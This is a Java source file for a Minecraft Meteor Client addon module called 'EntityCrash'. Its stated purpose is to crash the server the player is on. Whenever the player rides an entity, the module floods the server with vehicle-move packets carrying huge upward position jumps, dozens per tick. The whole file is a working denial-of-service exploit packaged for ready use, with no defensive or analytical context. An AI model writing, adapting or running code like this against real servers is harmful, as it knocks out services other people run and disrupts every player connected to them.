package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import minegame159.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.settings.*;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;

public class EntityCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Double> speed = sgGeneral.add(new DoubleSetting.Builder()
            .name("speed")
            .description("Speed in blocks per second.")
            .defaultValue(1337)
            .min(1)
            .sliderMax(10000)
            .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many tries per tick.")
            .defaultValue(38)
            .min(1)
            .sliderMax(100)
            .build()
    );

    public EntityCrash() {
        super(MeteorCrashAddon.CATEGORY, "entity-crash", "Tries to crash the server when you are riding an entity.");
    }

    @Override
    public void onActivate() {
        if (mc.player.getVehicle() == null) {
            ChatUtils.moduleError(this, "You must be riding an entity - disabling.");
            toggle();
        }
    }

    @EventHandler
    public void onTick(TickEvent.Post event) {
        Entity entity = mc.player.getVehicle();
        for (int i = 0; i < amount.get(); i++) {
            Vec3d v = entity.getPos();
            entity.setPos(v.x, v.y + speed.get(), v.z);
            VehicleMoveC2SPacket packet = new VehicleMoveC2SPacket(entity);
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
        }
    }
}
